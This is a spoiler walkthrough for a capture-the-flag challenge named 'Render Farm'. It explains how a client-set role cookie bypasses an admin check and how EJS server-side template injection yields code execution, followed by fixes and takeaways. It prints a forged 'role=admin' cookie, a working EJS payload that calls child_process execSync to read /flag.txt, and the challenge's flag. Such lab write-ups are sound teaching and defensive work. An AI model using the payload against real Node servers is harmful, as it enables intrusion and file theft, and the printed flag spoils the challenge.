# Walkthrough — Render Farm  (SPOILERS)

**Chain:** broken access control (client-trusted role) → server-side template injection (EJS) → RCE → flag.

## 1. Access control flaw
`/preview` is "admins only":
```js
if (req.cookies.role !== 'admin') return res.status(403)...
```
The role is read from a **cookie the client sets**. Send `Cookie: role=admin` and you're through. The
check trusts client state, so it enforces nothing.

## 2. SSTI
Past the check, the request body is rendered as a template:
```js
const output = ejs.render(template, { company: 'Render Farm Inc.' });
```
EJS compiles templates into JavaScript that runs on the server. User-controlled template = arbitrary
server-side JS = RCE.

## 3. RCE
`process` is a Node global, so from inside an EJS tag:
```
<%= process.mainModule.require('child_process').execSync('cat /flag.txt') %>
```
POST that as `template` with the `role=admin` cookie:
```
→ FLAG{ejs_templates_run_server_side_js}
```

## Fixes
- Enforce authorization **server-side** from the authenticated session, never from a client cookie/field.
- Never render user input as a template. If users need formatting, use a logic-less, sandboxed engine
  (e.g. a strict Mustache/Handlebars configuration) and pass user content strictly as **data**, not template.

## Takeaways
- "Admin only" means nothing when "admin" is a value the client supplies.
- Many JS template engines execute code. If attacker input reaches the *template* position (not the
  data position), assume RCE until proven otherwise.
